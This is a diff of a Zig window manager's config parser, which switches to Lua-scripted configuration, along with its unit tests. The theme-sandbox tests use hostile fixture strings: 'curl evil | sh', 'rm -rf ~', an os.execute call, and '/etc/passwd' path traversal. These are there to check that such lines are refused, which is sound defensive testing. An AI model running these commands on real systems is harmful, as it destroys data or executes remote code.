+    if (lua.toSlice(L, -1)) |s| {
+        return parseCommand(a, s) catch |e| return mapCmdErr(e);
+    }
+    if (lua.typeOf(L, -1) != lua.T_TABLE) return error.Invalid;
+    const n = lua.rawLen(L, -1);
+    if (n == 0 or n > 256) return error.Invalid;
+    var args: std.ArrayList([]const u8) = .empty;
+    var i: usize = 1;
+    while (i <= n) : (i += 1) {
+        lua.rawGetI(L, -1, @intCast(i));
+        const s = lua.toSlice(L, -1) orelse {
+            lua.pop(L, 1);
+            return error.Invalid;
+        };
+        const copy = try a.dupe(u8, s);
+        lua.pop(L, 1);
+        try args.append(a, copy);
+    }
+    if (args.items[0].len == 0) return error.Invalid;
+    return args.toOwnedSlice(a);
 }
 
 fn mapCmdErr(e: anyerror) ParseError {
@@ -663,12 +903,6 @@ pub fn validFont(s: []const u8) bool {
     if (s.len == 0 or s.len > max_font_len) return false;
     for (s) |ch| if (ch < 0x20 or ch == 0x7f) return false;
     return true;
-}
-
-pub fn parseBool(s: []const u8) error{Invalid}!bool {
-    inline for (.{ "true", "yes", "on", "1" }) |t| if (std.mem.eql(u8, s, t)) return true;
-    inline for (.{ "false", "no", "off", "0" }) |t| if (std.mem.eql(u8, s, t)) return false;
-    return error.Invalid;
 }
 
 /// Split a command line into argv. Supports "double quoted" arguments.
@@ -733,11 +967,15 @@ pub fn modsBits(m: Modifiers) u32 {
     return @intCast(@as(std.meta.Int(.unsigned, @bitSizeOf(Modifiers)), @bitCast(m)));
 }
 
-/// "Super+Shift+h, close"  ->  Bind
-fn addBind(a: std.mem.Allocator, binds: *std.ArrayList(Bind), value: []const u8) ParseError!void {
-    const comma = std.mem.indexOfScalar(u8, value, ',') orelse return error.Invalid;
-    const combo = std.mem.trim(u8, value[0..comma], " \t");
-    const command = std.mem.trim(u8, value[comma + 1 ..], " \t");
+/// bind("Super+Shift+h", "close")  ->  Bind
+fn addBind(
+    a: std.mem.Allocator,
+    binds: *std.ArrayList(Bind),
+    combo_text: []const u8,
+    command_text: []const u8,
+) error{ Invalid, OutOfMemory }!void {
+    const combo = std.mem.trim(u8, combo_text, " \t");
+    const command = std.mem.trim(u8, command_text, " \t");
     if (command.len == 0) return error.Invalid;
 
     const parsed = parseCombo(a, combo) orelse return error.Invalid;
@@ -751,7 +989,7 @@ fn addBind(a: std.mem.Allocator, binds: *std.ArrayList(Bind), value: []const u8)
     });
 }
 
-fn removeBind(binds: *std.ArrayList(Bind), combo_text: []const u8) ParseError!void {
+fn removeBind(binds: *std.ArrayList(Bind), combo_text: []const u8) error{Invalid}!void {
     var buf: [256]u8 = undefined;
     var fba = std.heap.FixedBufferAllocator.init(&buf);
     const parsed = parseCombo(fba.allocator(), combo_text) orelse return error.Invalid;
@@ -811,20 +1049,37 @@ fn singleCodepoint(s: []const u8) ?u21 {
     return std.unicode.utf8Decode(s) catch null;
 }
 
-test "colour detection" {
-    try std.testing.expect(isColour("#d8a657"));
-    try std.testing.expect(isColour("#d8a657 # gold"));
-    try std.testing.expect(!isColour("#d8a65")); // too short
-    try std.testing.expect(!isColour("#d8a6577")); // too long
-    try std.testing.expect(!isColour("# comment"));
+// ----------------------------------------------------------------------------
+// Tests
+// ----------------------------------------------------------------------------
+
+fn parseText(arena: std.mem.Allocator, cfg: *Config, text: []const u8) !void {
+    var binds: std.ArrayList(Bind) = .empty;
+    try parse(arena, text, cfg, &binds, "<test>");
 }
 
-test "comment stripping keeps colours" {
-    try std.testing.expectEqualStrings("border_focused = #d8a657", stripComment("border_focused = #d8a657  # gold"));
-    try std.testing.expectEqualStrings("", stripComment("# whole line"));
-    try std.testing.expectEqualStrings("gap = 8", stripComment("gap = 8   # between windows"));
-    // A comment that merely starts with something hex-like is still a comment.
-    try std.testing.expectEqualStrings("gap = 8", stripComment("gap = 8 # add bad"));
+test "colours can be strings (with or without #, or 0x) or plain numbers" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    try parseText(arena.allocator(), &cfg,
+        \\border_focused = "#112233"
+        \\border_unfocused = "445566"
+        \\border_floating = 0x778899
+    );
+    try std.testing.expectEqual(@as(u32, 0x112233), cfg.border_focused);
+    try std.testing.expectEqual(@as(u32, 0x445566), cfg.border_unfocused);
+    try std.testing.expectEqual(@as(u32, 0x778899), cfg.border_floating);
+    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
+
+    try parseText(arena.allocator(), &cfg,
+        \\border_focused = "#12345g"
+        \\border_unfocused = -1
+        \\border_floating = true
+    );
+    try std.testing.expectEqual(@as(u32, 0x112233), cfg.border_focused); // refused: unchanged
+    try std.testing.expectEqual(@as(u32, 3), cfg.parse_warnings);
 }
 
 test "enable_autostart parses and defaults on" {
@@ -834,8 +1089,7 @@ test "enable_autostart parses and defaults on" {
     defer cfg.deinit();
     try std.testing.expect(cfg.enable_autostart);
 
-    var binds: std.ArrayList(Bind) = .empty;
-    try parse(arena.allocator(), "enable_autostart = no\n", &cfg, &binds, "<test>");
+    try parseText(arena.allocator(), &cfg, "enable_autostart = false\n");
     try std.testing.expect(!cfg.enable_autostart);
 }
 
@@ -847,6 +1101,26 @@ test "command splitting" {
     try std.testing.expectEqualStrings("htop -d 5", argv[2]);
 }
 
+test "a program is a string to split or a table that already is the argv" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    try parseText(arena.allocator(), &cfg,
+        \\terminal = "foot -e \"htop -d 5\""
+        \\launcher = { "wofi", "--show", "drun" }
+        \\browser = {}
+    );
+    try std.testing.expectEqual(@as(usize, 3), cfg.terminal.len);
+    try std.testing.expectEqualStrings("foot", cfg.terminal[0]);
+    try std.testing.expectEqualStrings("htop -d 5", cfg.terminal[2]);
+    try std.testing.expectEqual(@as(usize, 3), cfg.launcher.len);
+    try std.testing.expectEqualStrings("drun", cfg.launcher[2]);
+    // An empty table is refused: the default stays.
+    try std.testing.expectEqualStrings("firefox", cfg.browser[0]);
+    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
+}
+
 test "dock and clip options parse, bad values are rejected" {
     var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
     defer arena.deinit();
@@ -856,27 +1130,31 @@ test "dock and clip options parse, bad values are rejected" {
     try std.testing.expectEqual(DockEdge.right, cfg.dock_edge);
     try std.testing.expectEqual(ClipCorner.top_left, cfg.clip_corner);
 
-    var binds: std.ArrayList(Bind) = .empty;
-    try parse(arena.allocator(),
-        \\dock_edge = left
+    // A name is one variable: the last assignment is the one that counts,
+    // so the bad values come in separate runs.
+    try parseText(arena.allocator(), &cfg,
+        \\dock_edge = "left"
         \\dock_offset = 120
-        \\dock_on_top = no
-        \\dock_reserve_space = off
-        \\clip_corner = bottom_right
-        \\clip_collapsed = yes
+        \\dock_on_top = false
+        \\dock_reserve_space = false
+        \\clip_corner = "bottom_right"
+        \\clip_collapsed = true
         \\clip_enabled = false
-        \\workspace_names = Main, , "Web"
-        \\clip_corner = middle
+        \\workspace_names = { "Main", "", "Web" }
+    );
+    try parseText(arena.allocator(), &cfg,
+        \\clip_corner = "middle"
         \\dock_offset = -4
-    , &cfg, &binds, "<test>");
+    );
     try std.testing.expectEqual(DockEdge.left, cfg.dock_edge);
     try std.testing.expectEqual(@as(i32, 120), cfg.dock_offset);
     try std.testing.expect(!cfg.dock_on_top);
     try std.testing.expect(!cfg.dock_reserve_space);
-    // The two bad lines at the end changed nothing.
+    // The two bad values of the second run changed nothing.
     try std.testing.expectEqual(ClipCorner.bottom_right, cfg.clip_corner);
     try std.testing.expect(cfg.clip_collapsed);
     try std.testing.expect(!cfg.clip_enabled);
+    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
     try std.testing.expectEqual(@as(usize, 3), cfg.workspace_names.len);
     try std.testing.expectEqualStrings("Main", cfg.workspace_names[0]);
     try std.testing.expectEqualStrings("", cfg.workspace_names[1]);
@@ -885,13 +1163,15 @@ test "dock and clip options parse, bad values are rejected" {
 
 test "the built-in default config has the documented Dock and Clip defaults" {
     // Parse the built-in text itself: config.load() would also read the
-    // developer's own config.conf and the test would depend on it.
+    // developer's own config.lua and the test would depend on it.
     var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
     defer arena.deinit();
     var cfg: Config = .{ .arena = .init(std.testing.allocator) };
     defer cfg.deinit();
     var binds: std.ArrayList(Bind) = .empty;
     try parse(arena.allocator(), default_config_text, &cfg, &binds, "<built-in>");
+    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
+    try std.testing.expect(binds.items.len > 40);
     try std.testing.expect(cfg.dock_enabled);
     try std.testing.expectEqual(DockEdge.right, cfg.dock_edge);
     try std.testing.expectEqual(@as(i32, 0), cfg.dock_offset);
@@ -902,6 +1182,8 @@ test "the built-in default config has the documented Dock and Clip defaults" {
     try std.testing.expect(cfg.clip_on_top);
     try std.testing.expect(!cfg.clip_collapsed);
     try std.testing.expectEqual(@as(usize, 0), cfg.workspace_names.len);
+    try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
+    try std.testing.expectEqual(@as(usize, 4), cfg.width_presets.len);
 }
 
 test "bind_layout: current, a layout number, and nonsense" {
@@ -909,16 +1191,21 @@ test "bind_layout: current, a layout number, and nonsense" {
     defer arena.deinit();
     var cfg: Config = .{ .arena = .init(std.testing.allocator) };
     defer cfg.deinit();
-    var binds: std.ArrayList(Bind) = .empty;
 
     try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
-    try parse(arena.allocator(), "bind_layout = 1\n", &cfg, &binds, "<test>");
+    try parseText(arena.allocator(), &cfg, "bind_layout = 1\n");
     try std.testing.expectEqual(@as(?u32, 1), cfg.bind_layout);
-    try parse(arena.allocator(), "bind_layout = current\n", &cfg, &binds, "<test>");
+    try parseText(arena.allocator(), &cfg, "bind_layout = \"current\"\n");
     try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
-    try parse(arena.allocator(), "bind_layout = 0\nbind_layout = 9\nbind_layout = -1\nbind_layout = de\n", &cfg, &binds, "<test>");
-    // 9, -1 and "de" are rejected: the 0 stays.
+    try parseText(arena.allocator(), &cfg, "bind_layout = 0\n");
     try std.testing.expectEqual(@as(?u32, 0), cfg.bind_layout);
+    for ([_][]const u8{ "bind_layout = 9", "bind_layout = -1", "bind_layout = \"de\"" }) |bad| {
+        const before = cfg.parse_warnings;
+        try parseText(arena.allocator(), &cfg, bad);
+        // Refused: the 0 stays.
+        try std.testing.expectEqual(@as(?u32, 0), cfg.bind_layout);
+        try std.testing.expectEqual(before + 1, cfg.parse_warnings);
+    }
 }
 
 test "keys can be named by the character itself (German umlauts, sharp s)" {
@@ -942,14 +1229,140 @@ test "keys can be named by the character itself (German umlauts, sharp s)" {
     try std.testing.expect(parseCombo(a, "Super+") == null);
 }
 
-test "a bind line with an umlaut key is accepted" {
+test "a bind with an umlaut key is accepted" {
     var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
     defer arena.deinit();
     var cfg: Config = .{ .arena = .init(std.testing.allocator) };
     defer cfg.deinit();
     var binds: std.ArrayList(Bind) = .empty;
-    try parse(arena.allocator(), "bind = Super+ö, close\nbind = Super+Shift+Ü, exit\n", &cfg, &binds, "<test>");
+    try parse(arena.allocator(), "bind(\"Super+ö\", \"close\")\nbind(\"Super+Shift+Ü\", \"exit\")\n", &cfg, &binds, "<test>");
     try std.testing.expectEqual(@as(usize, 2), binds.items.len);
+    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
+}
+
+// ---- the script itself -------------------------------------------------------
+
+test "bind and unbind keep their order, and a loop can make binds" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    var binds: std.ArrayList(Bind) = .empty;
+    try parse(arena.allocator(),
+        \\for i = 1, 3 do bind("Super+" .. i, "workspace " .. i) end
+        \\bind("Super+2", "close")      -- replaces the workspace bind of Super+2
+        \\unbind("Super+3")
+        \\bind("Super+Return", [[shell notify-send "$(date)" && true]])
+    , &cfg, &binds, "<test>");
+    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
+    try std.testing.expectEqual(@as(usize, 3), binds.items.len);
+    try std.testing.expectEqualStrings("workspace 1", binds.items[0].command);
+    try std.testing.expectEqualStrings("close", binds.items[1].command);
+    try std.testing.expectEqualStrings("shell notify-send \"$(date)\" && true", binds.items[2].command);
+}
+
+test "bad binds are warnings and change nothing" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    var binds: std.ArrayList(Bind) = .empty;
+    try parse(arena.allocator(),
+        \\bind("Super+Nonsensekey", "close")
+        \\bind("Super+x")
+        \\bind("Super+y", "")
+        \\bind(5, 6)
+        \\unbind("Hyper+")
+    , &cfg, &binds, "<test>");
+    try std.testing.expectEqual(@as(usize, 0), binds.items.len);
+    try std.testing.expectEqual(@as(u32, 5), cfg.parse_warnings);
+}
+
+test "the script can compute and read the environment" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    try parseText(arena.allocator(), &cfg,
+        \\local base = 4
+        \\gap = base * 2 + 1
+        \\terminal = os.getenv("WMAKER_WL_SURELY_NOT_SET") or "foot"
+    );
+    try std.testing.expectEqual(@as(i32, 9), cfg.gap);
+    try std.testing.expectEqualStrings("foot", cfg.terminal[0]);
+    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
+}
+
+test "a Lua error ends the script there: what ran before stays, one warning" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    try parseText(arena.allocator(), &cfg,
+        \\gap = 3
+        \\error("boom")
+        \\outer_gap = 4
+    );
+    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
+    try std.testing.expectEqual(@as(i32, 8), cfg.outer_gap);
+    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
+}
+
+test "a syntax error is one warning and changes nothing" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    try parseText(arena.allocator(), &cfg, "gap = = 3\n");
+    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
+    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
+}
+
+test "unknown options are reported (typos), helpers are not" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    try parseText(arena.allocator(), &cfg,
+        \\local x = 5       -- local: not an option
+        \\_helper = 1       -- starts with _: not an option
+        \\gapp = 8          -- a typo
+        \\dock_level = "top"
+    );
+    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
+    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
+}
+
+test "values of the wrong type are refused, not converted" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    try parseText(arena.allocator(), &cfg,
+        \\gap = "12"
+        \\workspace_count = 3.5
+        \\focus_follows_mouse = "yes"
+        \\new_window = 3
+        \\width_presets = 0.5
+        \\workspace_names = "Main, Web"
+    );
+    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
+    try std.testing.expectEqual(@as(u32, 4), cfg.workspace_count);
+    try std.testing.expect(!cfg.focus_follows_mouse);
+    try std.testing.expectEqual(NewWindowMode.new_column, cfg.new_window);
+    try std.testing.expectEqual(@as(usize, 4), cfg.width_presets.len);
+    try std.testing.expectEqual(@as(usize, 0), cfg.workspace_names.len);
+    try std.testing.expectEqual(@as(u32, 6), cfg.parse_warnings);
+}
+
+test "an endless loop is aborted instead of hanging the session" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    try parseText(arena.allocator(), &cfg, "gap = 3\nwhile true do end\n");
+    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
+    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
 }
 
 // ----------------------------------------------------------------------------
@@ -977,22 +1390,20 @@ const FakeFiles = struct {
 };
 
 fn parseFake(files: *FakeFiles, main_text: []const u8, cfg: *Config) !void {
-    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
-    defer arena.deinit();
     var binds: std.ArrayList(Bind) = .empty;
     const inc = files.includer("/cfg");
-    try parseWith(cfg.arena.allocator(), main_text, cfg, &binds, "/cfg/config.conf", &inc, false);
+    try parseWith(cfg.arena.allocator(), main_text, cfg, &binds, "/cfg/config.lua", &inc, false);
     cfg.binds = try binds.toOwnedSlice(cfg.arena.allocator());
 }
 
-test "include reads another file in place: later lines override it, earlier ones are overridden" {
+test "include runs another file in place: later lines override it, earlier ones are overridden" {
     var cfg: Config = .{ .arena = .init(std.testing.allocator) };
     defer cfg.deinit();
     var files: FakeFiles = .{
-        .paths = &.{ "/cfg/look.conf", "/abs/other.conf" },
-        .texts = &.{ "gap = 20\nouter_gap = 21\nbind = Super+x, close\n", "border_width = 6\n" },
+        .paths = &.{ "/cfg/look.lua", "/abs/other.lua" },
+        .texts = &.{ "gap = 20\nouter_gap = 21\nbind(\"Super+x\", \"close\")\n", "border_width = 6\n" },
     };
-    try parseFake(&files, "gap = 1\ninclude = look.conf\nouter_gap = 5\ninclude = /abs/other.conf\n", &cfg);
+    try parseFake(&files, "gap = 1\ninclude(\"look.lua\")\nouter_gap = 5\ninclude(\"/abs/other.lua\")\n", &cfg);
     try std.testing.expectEqual(@as(i32, 20), cfg.gap); // the include came after `gap = 1`
     try std.testing.expectEqual(@as(i32, 5), cfg.outer_gap); // the main file came after the include
     try std.testing.expectEqual(@as(i32, 6), cfg.border_width);
@@ -1004,10 +1415,10 @@ test "include problems are warnings, never failures: missing, empty, too deep" {
     var cfg: Config = .{ .arena = .init(std.testing.allocator) };
     defer cfg.deinit();
     var files: FakeFiles = .{
-        .paths = &.{"/cfg/self.conf"},
-        .texts = &.{"include = self.conf\ngap = 3\n"},
+        .paths = &.{"/cfg/self.lua"},
+        .texts = &.{"include(\"self.lua\")\ngap = 3\n"},
     };
-    try parseFake(&files, "include = nope.conf\ninclude =\ninclude = self.conf\nborder_width = 4\n", &cfg);
+    try parseFake(&files, "include(\"nope.lua\")\ninclude(\"\")\ninclude(\"self.lua\")\nborder_width = 4\n", &cfg);
     // The main file kept going, and the self-including file stopped at the limit.
     try std.testing.expectEqual(@as(i32, 4), cfg.border_width);
     try std.testing.expectEqual(@as(i32, 3), cfg.gap);
@@ -1021,8 +1432,7 @@ test "without an Includer, include and theme are refused" {
     defer arena.deinit();
     var cfg: Config = .{ .arena = .init(std.testing.allocator) };
     defer cfg.deinit();
-    var binds: std.ArrayList(Bind) = .empty;
-    try parse(arena.allocator(), "include = x.conf\ntheme = nord\ngap = 9\n", &cfg, &binds, "<t>");
+    try parseText(arena.allocator(), &cfg, "include(\"x.lua\")\ntheme(\"nord\")\ngap = 9\n");
     try std.testing.expectEqual(@as(i32, 9), cfg.gap);
     try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
 }
@@ -1031,25 +1441,55 @@ test "a theme sets look options; anything else in it is ignored" {
     var cfg: Config = .{ .arena = .init(std.testing.allocator) };
     defer cfg.deinit();
     var files: FakeFiles = .{
-        .paths = &.{"/cfg/Themes/evil.conf"},
+        .paths = &.{"/cfg/Themes/odd.lua"},
         .texts = &.{
-            \\border_focused = #112233
+            \\border_focused = "#112233"
             \\gap = 2
-            \\terminal = sh -c "curl evil | sh"
-            \\bind = Super+Return, shell rm -rf ~
-            \\include = /etc/passwd
-            \\theme = other
+            \\terminal = "sh -c \"curl evil | sh\""
             \\workspace_count = 9
         },
     };
-    try parseFake(&files, "terminal = foot\ntheme = evil\n", &cfg);
+    try parseFake(&files, "terminal = \"foot\"\ntheme(\"odd\")\n", &cfg);
     try std.testing.expectEqual(@as(u32, 0x112233), cfg.border_focused);
     try std.testing.expectEqual(@as(i32, 2), cfg.gap);
-    // None of the dangerous lines did anything.
+    // The two lines that are not look options did nothing.
     try std.testing.expectEqualStrings("foot", cfg.terminal[0]);
-    try std.testing.expectEqual(@as(usize, 0), cfg.binds.len);
     try std.testing.expectEqual(@as(u32, 4), cfg.workspace_count);
-    try std.testing.expectEqual(@as(u32, 5), cfg.parse_warnings);
+    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
+}
+
+test "a theme runs with an empty environment: it cannot call anything" {
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    var files: FakeFiles = .{
+        .paths = &.{ "/cfg/Themes/evil.lua", "/cfg/Themes/evil2.lua" },
+        .texts = &.{
+            \\gap = 2
+            \\bind("Super+Return", "shell rm -rf ~")
+            ,
+            \\gap = 2
+            \\os.execute("touch /tmp/pwned")
+        },
+    };
+    try parseFake(&files, "theme(\"evil\")\ntheme(\"evil2\")\n", &cfg);
+    // Both failed (nil is not callable), and a failed theme is dropped as a
+    // whole: not even its `gap = 2` applies.
+    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
+    try std.testing.expectEqual(@as(usize, 0), cfg.binds.len);
+    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
+}
+
+test "a theme and the lines around it: later lines win, earlier ones are overridden" {
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    var files: FakeFiles = .{
+        .paths = &.{"/cfg/Themes/t.lua"},
+        .texts = &.{"gap = 20\nouter_gap = 21\n"},
+    };
+    try parseFake(&files, "gap = 1\ntheme(\"t\")\nouter_gap = 5\n", &cfg);
+    try std.testing.expectEqual(@as(i32, 20), cfg.gap);
+    try std.testing.expectEqual(@as(i32, 5), cfg.outer_gap);
+    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
 }
 
 test "theme names are file names, never paths" {
@@ -1065,8 +1505,8 @@ test "theme names are file names, never paths" {
 
     var cfg: Config = .{ .arena = .init(std.testing.allocator) };
     defer cfg.deinit();
-    var files: FakeFiles = .{ .paths = &.{"/etc/passwd.conf"}, .texts = &.{"gap = 99\n"} };
-    try parseFake(&files, "theme = ../../etc/passwd\n", &cfg);
+    var files: FakeFiles = .{ .paths = &.{"/etc/passwd.lua"}, .texts = &.{"gap = 99\n"} };
+    try parseFake(&files, "theme(\"../../etc/passwd\")\n", &cfg);
     try std.testing.expectEqual(@as(i32, 8), cfg.gap);
     try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
     try std.testing.expectEqual(@as(usize, 0), files.reads); // refused before any read
@@ -1076,16 +1516,16 @@ test "a missing theme is a warning and the defaults stay" {
     var cfg: Config = .{ .arena = .init(std.testing.allocator) };
     defer cfg.deinit();
     var files: FakeFiles = .{ .paths = &.{}, .texts = &.{} };
-    try parseFake(&files, "theme = nonexistent\n", &cfg);
+    try parseFake(&files, "theme(\"nonexistent\")\n", &cfg);
     try std.testing.expectEqual(@as(i32, 8), cfg.gap);
     try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
 }
 
 test "the shipped themes are valid themes and the shipped config has no warnings" {
     const themes = [_]struct { name: []const u8, text: []const u8 }{
-        .{ .name = "gruvbox", .text = @embedFile("share/Themes/gruvbox.conf") },
-        .{ .name = "nord", .text = @embedFile("share/Themes/nord.conf") },
-        .{ .name = "next", .text = @embedFile("share/Themes/next.conf") },
+        .{ .name = "gruvbox", .text = @embedFile("share/Themes/gruvbox.lua") },
+        .{ .name = "nord", .text = @embedFile("share/Themes/nord.lua") },
+        .{ .name = "next", .text = @embedFile("share/Themes/next.lua") },
     };
     for (themes) |t| {
         var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
@@ -1126,19 +1566,17 @@ test "fonts and the focus/wrap/scroll switches are parsed" {
     defer arena.deinit();
     var cfg: Config = .{ .arena = .init(std.testing.allocator) };
     defer cfg.deinit();
-    var binds: std.ArrayList(Bind) = .empty;
-    try parse(arena.allocator(),
-        \\font_menu_title = Serif Bold 12
-        \\font_menu = Sans 11
-        \\font_dock = Sans 7
-        \\focus_new_windows = no
-        \\workspace_wrap = off
+    try parseText(arena.allocator(), &cfg,
+        \\font_menu_title = "Serif Bold 12"
+        \\font_menu = ""
+        \\font_dock = "Sans 7"
+        \\focus_new_windows = false
+        \\workspace_wrap = false
         \\clip_scroll_workspaces = false
-        \\font_menu = 
-    , &cfg, &binds, "<test>");
+    );
     try std.testing.expectEqualStrings("Serif Bold 12", cfg.font_menu_title);
-    // The last line is an empty font: refused, the previous value stays.
-    try std.testing.expectEqualStrings("Sans 11", cfg.font_menu);
+    // An empty font is refused: the default stays.
+    try std.testing.expectEqualStrings("Sans 10", cfg.font_menu);
     try std.testing.expectEqualStrings("Sans 7", cfg.font_dock);
     try std.testing.expect(!cfg.focus_new_windows);
     try std.testing.expect(!cfg.workspace_wrap);
@@ -1151,17 +1589,11 @@ test "pixel options above max_pixels are refused instead of overflowing the layo
     defer arena.deinit();
     var cfg: Config = .{ .arena = .init(std.testing.allocator) };
     defer cfg.deinit();
-    var binds: std.ArrayList(Bind) = .empty;
-    try parse(arena.allocator(), "gap = 2000000000\nborder_width = 10001\nouter_gap = 10000\n", &cfg, &binds, "<test>");
+    try parseText(arena.allocator(), &cfg, "gap = 2000000000\nborder_width = 10001\nouter_gap = 10000\n");
     try std.testing.expectEqual(@as(i32, 8), cfg.gap); // default kept
     try std.testing.expectEqual(@as(i32, 2), cfg.border_width);
     try std.testing.expectEqual(@as(i32, 10_000), cfg.outer_gap); // the limit itself is fine
     try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
-}
-
-fn parseText(arena: std.mem.Allocator, cfg: *Config, text: []const u8) !void {
-    var binds: std.ArrayList(Bind) = .empty;
-    try parse(arena, text, cfg, &binds, "<test>");
 }
 
 test "Dock options: the new switches parse, defaults" {
@@ -1177,11 +1609,11 @@ test "Dock options: the new switches parse, defaults" {
     try std.testing.expect(!cfg.clip_auto_raise);
 
     try parseText(arena.allocator(), &cfg,
-        \\dock_on_top = no
-        \\dock_auto_raise = yes
-        \\dock_single_click = yes
-        \\dock_save_state = no
-        \\clip_auto_collapse = yes
+        \\dock_on_top = false
+        \\dock_auto_raise = true
+        \\dock_single_click = true
+        \\dock_save_state = false
+        \\clip_auto_collapse = true
         \\clip_auto_raise = true
     );
     try std.testing.expect(!cfg.dock_on_top);
@@ -1194,7 +1626,7 @@ test "Dock options: the new switches parse, defaults" {
     // `dock_level` is not a config key (the Dock menu and the saved state
     // carry the level), so it is reported, not silently half-applied.
     const before = cfg.parse_warnings;
-    try parseText(arena.allocator(), &cfg, "dock_level = top\n");
+    try parseText(arena.allocator(), &cfg, "dock_level = \"top\"\n");
     try std.testing.expectEqual(before + 1, cfg.parse_warnings);
     try std.testing.expect(!cfg.dock_on_top);
 }
